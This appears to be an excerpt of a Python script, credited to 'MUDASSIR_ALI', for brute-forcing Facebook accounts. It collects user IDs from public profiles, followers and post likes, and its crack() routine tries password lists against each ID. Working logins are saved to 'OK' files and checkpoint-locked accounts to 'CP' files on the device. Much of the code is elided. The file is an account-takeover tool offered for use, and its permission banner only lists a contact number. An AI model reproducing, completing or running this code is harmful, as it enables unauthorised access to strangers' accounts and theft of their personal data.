...
def banner():
	clear()
	wel='# SCRIPT MULTI BRUTEFORCE FACEBOOK,SCRIPT PERETASAN FACEBOOK BERBASIS MULTI BRUTE, -SCRIPT PUBLISHER BY : MUDASSIR_ALI-'
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# THIS SCRIPT SHOULD ONLY BE USED BY PEOPLE WHO HAVE OBTAINED PERMISSION FROM AUTHOR : MUDASSIR ALI, CONTACT ACCESS PERMIT:+923439635677'
	fx = mark(sg, style=' bold blue')
	sol().print(fx)
	sg = '# 🖥️SCRIPT USER NAME🖥️ '
	fx = mark(sg, style=' bold green')
	sol().print(fx)
	print(x+'['+h+'✓'+x+'] NAME   VEER : '+str(my_name))
	print(x+'['+h+'✓'+x+'] USER ID       : '+str(my_id))
	print(x+'['+h+'✓'+x+'] IP ADDRESS    : '+str(sh['origin']))
	io = '''[bold green]║01║ DUMP ID FROM PUBLIC	    
║02║ DUMP ID FROM  PUBLIC (MASAL)   
║03║ DUMP ID FROM FOLLOWER		     
║04║ DUMP ID FROM LIKE POST	     
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/Veer-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/Veer-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/Veer-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/Veer-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/Veer-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'Veer'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/Veer-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/Veer-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/Veer-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/Veer-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'Veer'+x+'] ENTER LIMIT ID TOTAL [20]')
		try:
			jum = int(input(x+'['+p+'Veer'+x+'] Number Of Id : '))
		except ValueError:
		...
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'Veer'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
...
def dump_pengikut():
	...
	pil = input(x+'['+p+'Veer'+x+'] INPUT TARGET ID : ')
	try:
		...
		print(x+'['+h+'Veer'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
...
def dump_likes():
	...
	win2 = mark(win, style='bold green')
	sol().print(win2)
	pil = input(x+'['+p+'Veer'+x+'] INPUT ID POST : ')
	try:
...
def setting():
	...
	teks = '║01║ CRACK FROM OLD ID\n║02║ CRACK FROM NEW ID\n║03║ CRACK FROM RANDOM ID'
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%sVeer %s🐍%s 🐍 OK:%s 🐍 CP:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='Veer XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='Veer LIVE'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]Veer LIVE[/bold green]'))
					ok+=1
					break
